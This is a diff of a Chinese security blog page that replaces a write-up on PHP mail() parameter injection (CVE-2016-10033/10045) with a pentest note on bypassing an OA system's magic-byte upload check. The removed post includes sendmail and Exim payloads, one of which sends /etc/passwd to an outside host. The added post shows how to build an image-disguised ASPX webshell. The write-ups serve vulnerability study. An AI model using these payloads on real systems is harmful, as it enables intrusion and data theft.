@@ -16,11 +16,11 @@
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="心如花木当向阳而生">
   <meta name="author" content="0x7b">
-  <meta name="keywords" content="参数注入,RCE,参数注入">
+  <meta name="keywords" content="挖洞">
   
     <meta name="referrer" content="no-referrer" />
   
-  <title>从PHP mail()学习参数注入漏洞 - 0x7b&#39;s blog</title>
+  <title>挖不到洞真的是你的问题嘛 - 0x7b&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -226,7 +226,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="从PHP mail()学习参数注入漏洞">
+            <span class="h2" id="subtitle" title="挖不到洞真的是你的问题嘛">
               
             </span>
 
@@ -248,7 +248,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.6k 字
+      418 字
     </span>
   
 
@@ -258,7 +258,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      22
+      6
        分钟
     </span>
   
@@ -296,7 +296,7 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">从PHP mail()学习参数注入漏洞</h1>
+            <h1 style="display: none">挖不到洞真的是你的问题嘛</h1>
             
               <p class="note note-info">
                 
@@ -305,51 +305,18 @@
               </p>
             
             <div class="markdown-body">
-              <p>这里引用 P 牛原话解释参数注入漏洞</p>
-<blockquote>
-<p>参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</p>
-</blockquote>
-<h2 id="0x00-Mail-函数简介"><a href="#0x00-Mail-函数简介" class="headerlink" title="0x00 Mail 函数简介"></a>0x00 Mail 函数简介</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bool mail ( string <span class="hljs-variable">$to</span>  电子邮件收件人,或收件人列表<br>, string <span class="hljs-variable">$subject</span>       电子邮件的主题<br>, string <span class="hljs-variable">$message</span>       邮件内容<br>[, string <span class="hljs-variable">$additional_headers</span><br>[, string <span class="hljs-variable">$additional_parameters</span> ]] ) 许多web应用使用它设置发送者的地址和返回路径<br></code></pre></td></tr></table></figure>
+              <p>事情是这样，在一次渗透测试项目中发现了目标 OA 的一个弱口令，登入系统后找到了一处上传点。但在上传木马 getshell 的时候遇到了大坑，遂记录下来。<br>因为是开源 OA 先从源码简单分析下漏洞原理</p>
+<p>定位到编辑资料上传头像处</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">if</span> (this.Fup.HasFile)<br>&#123;<br>        FileExtension[] fileEx = <span class="hljs-keyword">new</span> FileExtension[]<br>        &#123;<br>                FileExtension.GIF,<br>                FileExtension.JPG,<br>                FileExtension.PNG,<br>                FileExtension.BMP<br>        &#125;;<br>        <span class="hljs-keyword">if</span> (FileSystemManager.IsAllowedExtension(this.Fup, fileEx))<br>        &#123;<br>                <span class="hljs-built_in">string</span> userName = sys_UserInfo.UserName;<br>                <span class="hljs-built_in">string</span> <span class="hljs-keyword">text</span> = base.Server.MapPath(<span class="hljs-string">"~/Files/common/"</span>);<br>                <span class="hljs-built_in">string</span> text2 = userName + Path.GetExtension(this.Fup.FileName);<br>                <span class="hljs-keyword">text</span> += text2;<br>                this.Fup.PostedFile.SaveAs(<span class="hljs-keyword">text</span>);<br>                sys_UserInfo.PerPic = text2;<br>                this.Fup.Dispose();<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>第五个参数（$additional_parameters），允许注入额外的参数给邮件发送程序，可以被注入恶意参数导致命令执行。在 Linux 系统上，mail 函数在底层由 MTA 邮件传输代理软件安装在系统上面，比如 sendmail、Exim、Postfix 等。</p>
-<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>以 CVE-2016-10033 为例，对比补丁分析<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619170554938-66f3909a-e890-486e-99b5-35e3dacd03ad.png#clientId=u5cac55bb-f53a-4&from=paste&height=48&id=u43be3204&margin=%5Bobject%20Object%5D&name=image.png&originHeight=96&originWidth=1711&originalType=binary&size=114337&status=done&style=none&taskId=u49991ebc-440c-4be5-b880-f76c7dd0f75&width=855.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>使用 escapeshellarg 来处理<code>$this-&gt;Sender</code>我们跟随<code>$param</code>的走向可知<code>$param</code>最终会被 mail 函数使用，在<code>class.phpmailer.php</code>的<code>mailPassthru</code>函数中<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619170727260-20329011-cd6a-4dcc-8f34-25b1675e2030.png#clientId=u5cac55bb-f53a-4&from=paste&height=365&id=uf42c9004&margin=%5Bobject%20Object%5D&name=image.png&originHeight=365&originWidth=748&originalType=binary&size=64379&status=done&style=none&taskId=u9567c337-fafb-4a6c-a568-891db087c81&width=748" srcset="/img/loading.gif" lazyload alt="image.png"><br>位于<code>\wp-includes\pluggable.php</code>中 wp_mail 函数调用 setFrom 设置 phpmailer<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619067903394-c74b6514-d5e7-42be-8441-6eebd6499fa9.png#clientId=u5cac55bb-f53a-4&from=paste&id=uecb72e30&margin=%5Bobject%20Object%5D&name=image.png&originHeight=689&originWidth=1059&originalType=binary&size=118043&status=done&style=none&taskId=u86aa0f05-7864-4d9a-af00-cd009ba88e9" srcset="/img/loading.gif" lazyload alt="image.png"><br>当调用 WordPress wp_mail()函数(忘记密码，注册用户)发送邮件时，WordPress 会根据<code>$SERVER_NAME</code>设置邮件域<code>$from_email=&#39;wordpress@&#39;.$sitename;</code>经过过滤之后传给易受攻击的 phpmailer 的 setFrom 函数。而<code>$SERVER_NAME</code>可以通过 http 中的 HOST 头赋值。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /wp-login.php?action=lostpassword HTTP/1.1<br>Host: inject<br>Connection: keep-alive<br>Content-Length: 99<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>Origin: http://120.55.42.95:8080<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://127.0.0.1:8080/wp-login.php?action=lostpassword<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: wordpress_test_cookie=WP+Cookie+check; wp-settings-time-1=1618994337; JSESSIONID=22E4F619EA19279F411F77FB5E3CB2C6<br><br>user_login=Admin%40foxmail.com&amp;redirect_to=&amp;wp-submit=%E8%8E%B7%E5%8F%96%E6%96%B0%E5%AF%86%E7%A0%81<br></code></pre></td></tr></table></figure>
+<p>判断文件合法性的方法</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> bool IsAllowedExtension(FileUpload fileUpload_0, FileExtension[] fileEx)<br>&#123;<br>        int contentLength = fileUpload_0.PostedFile.ContentLength;<br>        <span class="hljs-built_in">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[contentLength];<br>        fileUpload_0.PostedFile.InputStream.Read(buffer, <span class="hljs-number">0</span>, contentLength);<br>        MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(buffer);<br>        BinaryReader binaryReader = <span class="hljs-keyword">new</span> BinaryReader(memoryStream);<br>        <span class="hljs-built_in">string</span> <span class="hljs-keyword">text</span> = <span class="hljs-string">""</span>;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>                <span class="hljs-keyword">text</span> = binaryReader.ReadByte().ToString();<br>                <span class="hljs-keyword">text</span> += binaryReader.ReadByte().ToString();<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>        &#125;<br>        binaryReader.Close();<br>        memoryStream.Close();<br>        bool result;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; fileEx.Length; i++)<br>        &#123;<br>                FileExtension fileExtension = fileEx;<br>                <span class="hljs-keyword">if</span> (int.Parse(<span class="hljs-keyword">text</span>) == (int)fileExtension)<br>                &#123;<br>                        result = <span class="hljs-literal">true</span>;<br>                        <span class="hljs-keyword">return</span> result;<br>                &#125;<br>        &#125;<br>        result = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>如上请求将会传递以下参数给<code>/usr/sbin/sendmail</code>，并以<code>sh</code>执行<br><code>/usr/sbin/sendmail [-t] [-i] [-f wordpress@inject]</code><br>其中-t 和-i 参数由 PHP 自动添加。参数-t 使 sendmail 从标准输入中提取头，-i 阻止 sendmail 将<code>.</code>作为输入的结尾。-f 来自于 mail()函数的 additional_parameters。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">execve(<span class="hljs-string">"/bin/sh"</span>,<br>       [<span class="hljs-string">"sh"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"/usr/sbin/sendmail -t -i -f wordpress@inject extra"</span>],<br>       [/* 24 environment vars */])<br></code></pre></td></tr></table></figure>
+<p>其中 FileExtension 为枚举类型，白名单</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> FileExtension<br>&#123;<br>        JPG = <span class="hljs-number">255216</span>,<br>        GIF = <span class="hljs-number">7173</span>,<br>        BMP = <span class="hljs-number">6677</span>,<br>        PNG = <span class="hljs-number">13780</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>一般针对<strong>Sendmail MTA</strong>我们有以下几种攻击方法</p>
-<h3 id="X-任意文件写"><a href="#X-任意文件写" class="headerlink" title="-X 任意文件写"></a><del>-X 任意文件写</del></h3><p>-X logfile 是记录 log 文件的，就是可以写文件；<br><code>/usr/bin/sendmail –t –i -f 123@456 -OQueueDirectory=/tmp/ -X/var/www/shell.php</code><br>可简化为<code>/usr/bin/sendmail –t –i -f 123@456 -oQ=/tmp/ -X./shell.php</code></p>
-<h3 id="C-任意文件读"><a href="#C-任意文件读" class="headerlink" title="-C 任意文件读 ~"></a><del>-C 任意文件读 ~</del></h3><p>-C //file 是临时加载一个配置文件，就是可以读文件；<br><code>/usr/sbin/sendmail -i -t -C/etc/passwd -X/tmp/output.txt</code></p>
-<h3 id="O-覆盖配置文件执行代码"><a href="#O-覆盖配置文件执行代码" class="headerlink" title="-O 覆盖配置文件执行代码 ~"></a><del>-O 覆盖配置文件执行代码 ~</del></h3><p>-O //option=value 是临时设置一个邮件存储的临时目录的配置。<br><code>/usr/bin/sendmail –t –i -f 123@456 -oQ/tmp -X./upload/sendmail_cf</code></p>
-<p>但实际上 wordpress 对 server_name 传入值进行了 strtolower 处理，且 Linux 区分大小写故以上攻击方法均失效。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp19ryeo1038lmdsso1pZ ~]<span class="hljs-comment"># whereis sendmail</span><br>sendmail: /usr/sbin/sendmail /usr/sbin/sendmail.postfix /usr/lib/sendmail /usr/lib/sendmail.postfix /usr/share/man/man8/sendmail.8.gz<br>[root@iZbp19ryeo1038lmdsso1pZ ~]<span class="hljs-comment"># file /usr/sbin/sendmail</span><br>/usr/sbin/sendmail: symbolic link to `/etc/alternatives/mta<span class="hljs-string">'</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>Sendmail EXIM</strong>支持开启 exim4 字符串扩展，可通过-be 参数注入参数。我们可以利用以下扩展内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;run&#123;&lt;command&gt; &lt;args&gt;&#125;</span>&#123;&lt;string1&gt;&#125;&#123;&lt;string2&gt;&#125;&#125;<br>//执行命令&lt;<span class="hljs-built_in">command</span>&gt; &lt;args&gt;，成功返回string1，失败返回string2<br><br><span class="hljs-variable">$&#123;substr&#123;&lt;string1&gt;&#125;</span>&#123;&lt;string2&gt;&#125;&#123;&lt;string3&gt;&#125;&#125;<br>//字符串的截取，在string3中从string1开始截取string2个字符<br><br><span class="hljs-variable">$&#123;readfile&#123;&lt;file name&gt;&#125;</span>&#123;&lt;eol string&gt;&#125;&#125;<br>//读文件file name，以eol string分割<br><br><span class="hljs-variable">$&#123;readsocket&#123;&lt;name&gt;&#125;</span>&#123;&lt;request&gt;&#125;&#123;&lt;timeout&gt;&#125;&#123;&lt;eol string&gt;&#125;&#123;&lt;fail string&gt;&#125;&#125;<br>//发送socket消息，消息内容为request<br></code></pre></td></tr></table></figure>
-
-<p>在很多时候,很多特殊符号不能直接出现在 payload 中如：/，空格等。在 HOST 标头中出现<code>/</code>就会报 500 错误。这个时候我们就可以从环境变量中取值截取我们想要的字符。<br>Dawid Golunski 找到一个内部 exim 变量<code>${tod_log}</code>中包含空格，<code>${spool_directory}</code>包含<code>/</code>。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619151491109-61a7e77a-c644-41d1-a923-4f7786b7d951.png#clientId=u5cac55bb-f53a-4&from=paste&height=73&id=u17206e09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=435&originalType=binary&size=15603&status=done&style=none&taskId=u38f8ae6b-83c8-4bbf-88ba-3c574b83b91&width=435" srcset="/img/loading.gif" lazyload alt="image.png"><br>故接下来就可以用<code>${substr{0}{1}{$spool_directory}}</code>代替<code>/</code>，用<code>${substr{10}{1}{$tod_log}}</code>代替空格。</p>
-<h3 id="run-执行命令"><a href="#run-执行命令" class="headerlink" title="${run{}{}}执行命令"></a>${run{}{}}执行命令</h3><p>/usr/sbin/sendmail  –t  –i  -f  root@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}10.5.1.2${substr{13}{1}{$tod_log}}9999${substr{0}{1}{$spool_directory}}rce.txt}}<br>可以通过外带数据将将命令执行结果取出来，也可反弹 shell，写 webshell 等<br><a href="https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/</a></p>
-<h3 id="readfile-读文件"><a href="#readfile-读文件" class="headerlink" title="${readfile{}{}}读文件"></a>${readfile{}{}}读文件</h3><p>/usr/sbin/sendmail  –t  –i  -f  root@localhost -be ${readsocket{inet${substr{13}{1}{$tod_log}}10.5.1.2${substr{13}{1}{$tod_log}}9999}{${readfile{${substr{0}{1}{$spool_directory}}etc${substr{0}{1}{$spool_directory}}passwd}{}}}{3s}{}{failure}}</p>
-<h2 id="0x02-escapeshellarg-和-escapeshellcmd-混用导致的-Bypass"><a href="#0x02-escapeshellarg-和-escapeshellcmd-混用导致的-Bypass" class="headerlink" title="0x02 escapeshellarg 和 escapeshellcmd 混用导致的 Bypass"></a>0x02 escapeshellarg 和 escapeshellcmd 混用导致的 Bypass</h2><p>还是以 CVE-2016-10033 为例，它修复的方法为使用 escapeshellcmd 对$this-&gt;sender 进行处理<br>，而 phpmailer 在内部已经实现了 escapeshellarg，因两者的不恰当使用导致了 Bypass。先来科普以下 escapeshellarg 和 escapeshellcmd</p>
-<h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><ol>
-<li>确保用户只传递一个参数给命令</li>
-<li>用户不能指定更多的参数一个</li>
-<li>用户户不能执行不同的命令</li>
-</ol>
-<p>将给字符串增加一对单引号并且转义任何已经存在的单引号</p>
-<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><ol>
-<li>确保用户只执行一个命令</li>
-<li>用户可以指定不限数量的参数</li>
-<li>用户不能执行不同的命令</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&amp; <span class="hljs-comment"># ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $\ \x0A \xFF		//这些字符以及不配对' "会被转义</span><br></code></pre></td></tr></table></figure>
-
-<p>当一个参数经过 escapeshellarg 又经过 escapeshellcmd 处理时</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$cmd = escapeshellcmd(escapeshellarg($cmd));<br></code></pre></td></tr></table></figure>
-
-<p>如果此时 cmd 输入为 1’<br>那经过 escapeshellarg 就会变为<code>&#39;1&#39;\&#39;&#39;&#39;</code><br>再经过 escapeshellcmd 处理就变为<code>&#39;1&#39;\\&#39;&#39;\&#39;</code>,此时’已经逃了出来。又造成了参数逃逸（CVE-2016-10045）</p>
-<h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><p>[1] <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="noopener">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a><br>[2] <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html</a><br>[3] <a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98</a><br>[4] <a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p>
+<p>这里判断文件合法性的操作没有判断文件后缀，而是取文件内容前两个字节的十进制看是否在 FileExtension 里定义了。很经典的问题，通常可以制作上传图片马绕过。<br><code>copy normal.jpg/b + shell.aspx/a shell.jpg</code><br>我一般习惯生成正常图片格式如的，然后 burp 抓包把.jpg 改为.aspx，免得遇到前端验证等的一些情况</p>
+<p>坑点就在改包的过程！<br>直接在 RAW 包上修改.jpg 为.aspx 文件内容前几个字节也会变</p>
 
             </div>
             <hr>
@@ -359,9 +326,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
-                    
-                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">参数注入</a>
+                      <a class="hover-with-bg" href="/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/">碎碎念</a>
                     
                   </div>
                 
@@ -369,9 +334,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                      <a class="hover-with-bg" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">参数注入</a>
+                      <a class="hover-with-bg" href="/tags/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>
                     
                   </div>
                 
@@ -388,12 +353,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/posts/1007/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从PHP mail()学习参数注入漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/1008/">
-                        <span class="hidden-mobile">挖不到洞真的是你的问题嘛</span>
+                      <a href="/posts/1006/">
+                        <span class="hidden-mobile">[CVE-2019-12792]Vesta控制面板0.9.8-24-上载处理程序中的权限提升漏洞分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
